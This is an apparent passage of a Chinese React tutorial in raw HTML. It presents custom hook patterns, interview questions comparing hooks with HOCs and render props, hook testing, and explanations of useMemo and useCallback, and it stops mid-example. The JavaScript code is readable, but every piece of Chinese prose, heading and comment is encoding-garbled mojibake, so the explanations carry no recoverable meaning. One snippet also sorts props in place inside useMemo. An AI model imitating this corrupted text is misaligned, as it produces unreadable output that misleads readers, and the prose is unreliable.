title="è®¾è®¡æ¨¡å¼ä¸æœ€ä½³å®è·µ"></a>è®¾è®¡æ¨¡å¼ä¸æœ€ä½³å®è·µ</h3><p><strong>å‚æ•°ä¼ é€’ä¸è¿”å›å€¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// çµæ´»çš„å‚æ•°è®¾è®¡</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useToggle</span>(<span class="hljs-params">initial = <span class="hljs-literal">false</span></span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initial);<br>  <br>  <span class="hljs-comment">// æ”¯æŒç›´æ¥è®¾ç½®æˆ–åˆ‡æ¢</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggle</span> = (<span class="hljs-params">value</span>) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">&#x27;boolean&#x27;</span>) &#123;<br>      <span class="hljs-title function_">setState</span>(value);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> !prev);<br>    &#125;<br>  &#125;;<br>  <br>  <span class="hljs-comment">// è¿”å›çŠ¶æ€å’Œæ§åˆ¶æ–¹æ³•</span><br>  <span class="hljs-keyword">return</span> [state, toggle];<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> [isOpen, toggleOpen] = <span class="hljs-title function_">useToggle</span>(<span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><p><strong>ç»„åˆ Hook æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç»„åˆå¤šä¸ª Hook åˆ›å»ºå¤æ‚é€»è¾‘</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useUserProfile</span>(<span class="hljs-params">userId</span>) &#123;<br>  <span class="hljs-keyword">const</span> [user, loading, error] = <span class="hljs-title function_">useFetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">$&#123;userId&#125;</span>`</span>);<br>  <span class="hljs-keyword">const</span> [preferences, setPrefs] = <span class="hljs-title function_">useLocalStorage</span>(<span class="hljs-string">`prefs_<span class="hljs-subst">$&#123;userId&#125;</span>`</span>, &#123;&#125;);<br>  <span class="hljs-keyword">const</span> [notifications, addNotification] = <span class="hljs-title function_">useNotifications</span>();<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    user,<br>    preferences,<br>    <span class="hljs-attr">setPreferences</span>: setPrefs,<br>    notifications,<br>    addNotification,<br>    loading,<br>    error<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¾èµ–æ³¨å…¥æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºå¯é…ç½®çš„è‡ªå®šä¹‰ Hook</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useAPI</span>(<span class="hljs-params">endpoint, options = &#123;&#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br>  <br>  <span class="hljs-keyword">const</span> fetchData = <span class="hljs-title function_">useCallback</span>(<span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(endpoint, options);<br>      <span class="hljs-title function_">setData</span>(<span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>());<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>);<br>    &#125;<br>  &#125;, [endpoint, options]);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">fetchData</span>();<br>  &#125;, [fetchData]);<br>  <br>  <span class="hljs-keyword">return</span> &#123; data, loading, <span class="hljs-attr">refetch</span>: fetchData &#125;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> userAPI = <span class="hljs-title function_">useAPI</span>(<span class="hljs-string">&#x27;/api/users&#x27;</span>, &#123; <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;GET&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-10"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-10" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Qï¼šè‡ªå®šä¹‰ Hook å’Œ HOCï¼ˆé«˜é˜¶ç»„ä»¶ï¼‰&#x2F;Render Props æœ‰ä½•åŒºåˆ«ï¼Ÿ</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">è‡ªå®šä¹‰ Hook</th><th align="left">HOC</th><th align="left">Render Props</th></tr></thead><tbody><tr><td align="left">é€»è¾‘å¤ç”¨æ–¹å¼</td><td align="left">ç›´æ¥è°ƒç”¨ Hook</td><td align="left">åŒ…è£…ç»„ä»¶</td><td align="left">é€šè¿‡ props æ¸²æŸ“</td></tr><tr><td align="left">ç»„ä»¶å±‚çº§</td><td align="left">æ— é¢å¤–å±‚çº§</td><td align="left">å¢åŠ åŒ…è£…å±‚çº§</td><td align="left">å¢åŠ å›è°ƒå±‚çº§</td></tr><tr><td align="left">å‘½åå†²çª</td><td align="left">æ— </td><td align="left">å¯èƒ½å‘ç”Ÿ</td><td align="left">å¯èƒ½å‘ç”Ÿ</td></tr><tr><td align="left">è°ƒè¯•éš¾åº¦</td><td align="left">ç®€å•</td><td align="left">ç»„ä»¶æ ‘å˜æ·±</td><td align="left">å›è°ƒåµŒå¥—å¤æ‚</td></tr><tr><td align="left">TypeScript æ”¯æŒ</td><td align="left">ä¼˜ç§€</td><td align="left">ç±»å‹æ¨å¯¼å¤æ‚</td><td align="left">ç±»å‹æ¨å¯¼ä¸­ç­‰</td></tr></tbody></table><p>ç»“è®ºï¼š<br>è‡ªå®šä¹‰ Hook æ˜¯ React å®˜æ–¹æ¨èçš„é€»è¾‘å¤ç”¨æ–¹æ¡ˆï¼Œè§£å†³äº† HOC å’Œ Render Props çš„åµŒå¥—é—®é¢˜</p><p><strong>Qï¼šå¦‚ä½•æµ‹è¯•è‡ªå®šä¹‰ Hookï¼Ÿ</strong></p><p>æµ‹è¯•ç­–ç•¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ @testing-library/react-hooks</span><br><span class="hljs-keyword">import</span> &#123; renderHook, act &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@testing-library/react-hooks&#x27;</span>;<br><br><span class="hljs-title function_">test</span>(<span class="hljs-string">&#x27;should use counter&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; result &#125; = <span class="hljs-title function_">renderHook</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">useCounter</span>());<br>  <br>  <span class="hljs-title function_">expect</span>(result.<span class="hljs-property">current</span>[<span class="hljs-number">0</span>]).<span class="hljs-title function_">toBe</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// åˆå§‹å€¼</span><br>  <br>  <span class="hljs-title function_">act</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    result.<span class="hljs-property">current</span>[<span class="hljs-number">1</span>](); <span class="hljs-comment">// æ‰§è¡Œ increment</span><br>  &#125;);<br>  <br>  <span class="hljs-title function_">expect</span>(result.<span class="hljs-property">current</span>[<span class="hljs-number">0</span>]).<span class="hljs-title function_">toBe</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// æ›´æ–°åå€¼</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Qï¼šè‡ªå®šä¹‰ Hook ä¼šå¯¼è‡´å†…å­˜æ³„æ¼å—ï¼Ÿ</strong></p><p>é£é™©ä¸é˜²èŒƒï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useEventListener</span>(<span class="hljs-params">eventName, handler, element = <span class="hljs-variable language_">window</span></span>) &#123;<br>  <span class="hljs-keyword">const</span> savedHandler = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-comment">// ä¿å­˜æœ€æ–°å¤„ç†å‡½æ•°</span><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    savedHandler.<span class="hljs-property">current</span> = handler;<br>  &#125;, [handler]);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">eventListener</span> = event =&gt; savedHandler.<span class="hljs-title function_">current</span>(event);<br>    element.<span class="hljs-title function_">addEventListener</span>(eventName, eventListener);<br>    <br>    <span class="hljs-comment">// âœ… å¿…é¡»è¿”å›æ¸…ç†å‡½æ•°</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> element.<span class="hljs-title function_">removeEventListener</span>(eventName, eventListener);<br>  &#125;, [eventName, element]); <span class="hljs-comment">// ä¾èµ–å˜åŒ–æ—¶é‡æ–°ç»‘å®š</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å®è·µæ¡ˆä¾‹"><a href="#å®è·µæ¡ˆä¾‹" class="headerlink" title="å®è·µæ¡ˆä¾‹"></a>å®è·µæ¡ˆä¾‹</h3><p><strong>æƒé™æ§åˆ¶ Hook</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">usePermission</span>(<span class="hljs-params">requiredPermission</span>) &#123;<br>  <span class="hljs-keyword">const</span> [user] = <span class="hljs-title function_">useAuth</span>();<br>  <span class="hljs-keyword">const</span> [hasPermission, setHasPermission] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!user) <span class="hljs-keyword">return</span>;<br>    <br>    <span class="hljs-comment">// å¼‚æ­¥æ£€æŸ¥æƒé™ï¼ˆå¦‚è°ƒç”¨APIï¼‰</span><br>    <span class="hljs-title function_">checkPermission</span>(user.<span class="hljs-property">id</span>, requiredPermission).<span class="hljs-title function_">then</span>(setHasPermission);<br>  &#125;, [user, requiredPermission]);<br>  <br>  <span class="hljs-keyword">return</span> hasPermission;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">AdminPanel</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> canEdit = <span class="hljs-title function_">usePermission</span>(<span class="hljs-string">&#x27;admin_edit&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> canEdit ? <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Editor</span> /&gt;</span></span> : <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">PermissionDenied</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>çŠ¶æ€æœº Hook</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useStateMachine</span>(<span class="hljs-params">states, initialState</span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initialState);<br>  <br>  <span class="hljs-keyword">const</span> transition = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> currentState = state;<br>    <span class="hljs-keyword">const</span> nextState = states[currentState]?.[event];<br>    <br>    <span class="hljs-keyword">if</span> (!nextState) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`æ— æ•ˆè½¬æ¢: <span class="hljs-subst">$&#123;currentState&#125;</span> -&gt; <span class="hljs-subst">$&#123;event&#125;</span>`</span>);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-title function_">setState</span>(nextState);<br>  &#125;, [state, states]);<br>  <br>  <span class="hljs-keyword">return</span> [state, transition];<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> [state, transition] = <span class="hljs-title function_">useStateMachine</span>(&#123;<br>  <span class="hljs-attr">idle</span>: &#123; <span class="hljs-attr">START</span>: <span class="hljs-string">&#x27;running&#x27;</span> &#125;,<br>  <span class="hljs-attr">running</span>: &#123; <span class="hljs-attr">PAUSE</span>: <span class="hljs-string">&#x27;paused&#x27;</span>, <span class="hljs-attr">COMPLETE</span>: <span class="hljs-string">&#x27;done&#x27;</span> &#125;,<br>  <span class="hljs-attr">paused</span>: &#123; <span class="hljs-attr">RESUME</span>: <span class="hljs-string">&#x27;running&#x27;</span>, <span class="hljs-attr">CANCEL</span>: <span class="hljs-string">&#x27;idle&#x27;</span> &#125;,<br>  <span class="hljs-attr">done</span>: &#123; <span class="hljs-attr">RESET</span>: <span class="hljs-string">&#x27;idle&#x27;</span> &#125;<br>&#125;, <span class="hljs-string">&#x27;idle&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="è‡ªå®šä¹‰-Hook-è®¾è®¡åŸåˆ™"><a href="#è‡ªå®šä¹‰-Hook-è®¾è®¡åŸåˆ™" class="headerlink" title="è‡ªå®šä¹‰ Hook è®¾è®¡åŸåˆ™"></a>è‡ªå®šä¹‰ Hook è®¾è®¡åŸåˆ™</h3><ol><li>å•ä¸€èŒè´£ï¼šä¸€ä¸ª Hook åªè§£å†³ä¸€ä¸ªé—®é¢˜</li><li>å‘½åæ¸…æ™°ï¼šuse + åŠŸèƒ½åï¼ˆuseWindowSizeï¼‰</li><li>å‚æ•°åˆç†ï¼šæä¾›é»˜è®¤å€¼å’Œå¿…è¦é…ç½®</li><li>è¿”å›ç®€æ´ï¼šè¿”å›æ•°ç»„æˆ–å¯¹è±¡ç»“æ„</li><li>æ–‡æ¡£å®Œå–„ï¼šä½¿ç”¨ JSDoc è¯´æ˜ç”¨æ³•</li><li>ç±»å‹å®‰å…¨ï¼šTypeScript ç±»å‹å®šä¹‰</li></ol><h3 id="æ€»ç»“ï¼šè‡ªå®šä¹‰-Hook-ä»·å€¼"><a href="#æ€»ç»“ï¼šè‡ªå®šä¹‰-Hook-ä»·å€¼" class="headerlink" title="æ€»ç»“ï¼šè‡ªå®šä¹‰ Hook ä»·å€¼"></a>æ€»ç»“ï¼šè‡ªå®šä¹‰ Hook ä»·å€¼</h3><pre class="mermaid">graph TD  A[é€»è¾‘å¤ç”¨] --> B[å‡å°‘ä»£ç é‡å¤]  A --> C[ç»Ÿä¸€ä¸šåŠ¡é€»è¾‘]  D[å…³æ³¨ç‚¹åˆ†ç¦»] --> E[æå‡å¯ç»´æŠ¤æ€§]  D --> F[ä¾¿äºå•å…ƒæµ‹è¯•]  G[ç»„ä»¶ç®€åŒ–] --> H[æå‡å¯è¯»æ€§]  G --> I[é™ä½å¤æ‚åº¦]</pre><h2 id="3-6-å…¶ä»–å¸¸ç”¨-Hooksï¼ˆuseMemoã€useCallbackã€useRefï¼‰"><a href="#3-6-å…¶ä»–å¸¸ç”¨-Hooksï¼ˆuseMemoã€useCallbackã€useRefï¼‰" class="headerlink" title="3.6 å…¶ä»–å¸¸ç”¨ Hooksï¼ˆuseMemoã€useCallbackã€useRefï¼‰"></a>3.6 å…¶ä»–å¸¸ç”¨ Hooksï¼ˆuseMemoã€useCallbackã€useRefï¼‰</h2><h3 id="ä¸‰å¤§-Hook-å¿«é€Ÿå¯¹æ¯”"><a href="#ä¸‰å¤§-Hook-å¿«é€Ÿå¯¹æ¯”" class="headerlink" title="ä¸‰å¤§ Hook å¿«é€Ÿå¯¹æ¯”"></a>ä¸‰å¤§ Hook å¿«é€Ÿå¯¹æ¯”</h3><table><thead><tr><th align="left">Hook</th><th align="left">ä¸»è¦ä½œç”¨</th><th align="left">è¿”å›å€¼</th><th align="left">æ€§èƒ½ä¼˜åŒ–åŸç†</th></tr></thead><tbody><tr><td align="left">useMemo</td><td align="left">ç¼“å­˜è®¡ç®—ç»“æœ</td><td align="left">è®°å¿†åŒ–å€¼</td><td align="left">é¿å…é‡å¤è®¡ç®—</td></tr><tr><td align="left">useCallback</td><td align="left">ç¼“å­˜å‡½æ•°å¼•ç”¨</td><td align="left">è®°å¿†åŒ–å‡½æ•°</td><td align="left">é¿å…å­ç»„ä»¶ä¸å¿…è¦é‡æ¸²æŸ“</td></tr><tr><td align="left">useRef</td><td align="left">ä¿å­˜å¯å˜å€¼&#x2F;DOM å¼•ç”¨</td><td align="left">{ current: value }</td><td align="left">ä¸è§¦å‘é‡æ¸²æŸ“</td></tr></tbody></table><h3 id="useMemo-æ·±åº¦è§£æ"><a href="#useMemo-æ·±åº¦è§£æ" class="headerlink" title="useMemo æ·±åº¦è§£æ"></a>useMemo æ·±åº¦è§£æ</h3><p><strong>æ ¸å¿ƒè¯­æ³•</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> memoizedValue = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">computeExpensiveValue</span>(a, b), [a, b]);<br></code></pre></td></tr></table></figure><ul><li>è®¡ç®—å‡½æ•°ï¼šè¿”å›éœ€è¦ç¼“å­˜çš„å€¼</li><li>ä¾èµ–æ•°ç»„ï¼šå½“ä¾èµ–å˜åŒ–æ—¶é‡æ–°è®¡ç®—</li></ul><p><strong>å·¥ä½œåŸç†</strong></p><pre class="mermaid">graph LR  A[ç»„ä»¶æ¸²æŸ“] --> B{ä¾èµ–æ˜¯å¦å˜åŒ–?}  B -->|å¦| C[è¿”å›ç¼“å­˜å€¼]  B -->|æ˜¯| D[æ‰§è¡Œè®¡ç®—å‡½æ•°]  D --> E[ç¼“å­˜æ–°å€¼]  E --> F[è¿”å›æ–°å€¼]</pre><p><strong>ä½¿ç”¨åœºæ™¯</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åœºæ™¯1ï¼šé«˜å¼€é”€è®¡ç®—</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Component</span>(<span class="hljs-params">&#123; items &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> sortedItems = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> items.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a.<span class="hljs-property">value</span> - b.<span class="hljs-property">value</span>); <span class="hljs-comment">// æ’åºå¼€é”€å¤§</span><br>  &#125;, [items]);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">List</span> <span class="hljs-attr">items</span>=<span class="hljs-string">&#123;sortedItems&#125;</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// åœºæ™¯2ï¼šé¿å…ä¸å¿…è¦é‡æ¸²æŸ“</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params">&#123; user &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> userContext = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> (&#123; <br>    user, <br>    <span class="hljs-attr">isAdmin</span>: user.<span class="hljs-property">role</span> === <span class="hljs-string">&#x27;admin&#x27;</span> <br>  &#125;), [user]); <span class="hljs-comment">// ä¾èµ–å˜åŒ–æ—¶é‡å»º</span><br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">context</span>=<span class="hljs-string">&#123;userContext&#125;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é”™è¯¯ç”¨æ³•</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ é”™è¯¯1ï¼šæ²¡æœ‰ä¾èµ–æ•°ç»„ï¼ˆæ¯æ¬¡æ¸²æŸ“éƒ½è®¡ç®—ï¼‰</span><br><span class="hljs-keyword">const</span> value = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">compute</span>());<br><br><span class="hljs-comment">// âŒ é”™è¯¯2ï¼šä¾èµ–æ•°ç»„ä¸å…¨</span><br><span class="hljs-keyword">const</span> fullName = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;name&#125;</span> <span class="hljs-subst">$&#123;surname&#125;</span>`</span>, [name]);<br></code></pre></td></tr></table></figure><h3 id="useCallback-æ·±åº¦è§£æ"><a href="#useCallback-æ·±åº¦è§£æ" class="headerlink" title="useCallback æ·±åº¦è§£æ"></a>useCallback æ·±åº¦è§£æ</h3><p><strong>æ ¸å¿ƒè¯­æ³•</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> memoizedCallback = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">doSomething</span>(a, b);<br>&#125;, [a, b]);<br></code></pre></td></tr></table></figure><p><strong>ä¸ useMemo å…³ç³»</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// useCallback ç­‰ä»·äºï¼š</span><br><span class="hljs-keyword">const</span> memoizedCallback = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">doSomething</span>(a, b), [a, b]);<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨åœºæ™¯</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åœºæ™¯1ï¼šé¿å…å­ç»„ä»¶ä¸å¿…è¦é‡æ¸²æŸ“</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-comment">// âœ… ç¨³å®šå‡½æ•°å¼•ç”¨</span><br>  <span class="hljs-keyword">const</span> increment = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c + <span class="hljs-number">1</span>), []);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;increment&#125;</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Child</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">&#123; onClick &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// ä¾èµ–ç¨³å®šå‡½æ•°å¼•ç”¨ä¸ä¼šé‡æ¸²æŸ“</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;onClick&#125;</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;);<br><br><span class="hljs-comment">// åœºæ™¯2ï¼šä¾èµ–æ•°ç»„ä¸­çš„å‡½æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Form</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [text, setText] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <br>  <span class="hljs-keyword">const</span> handleSubmit 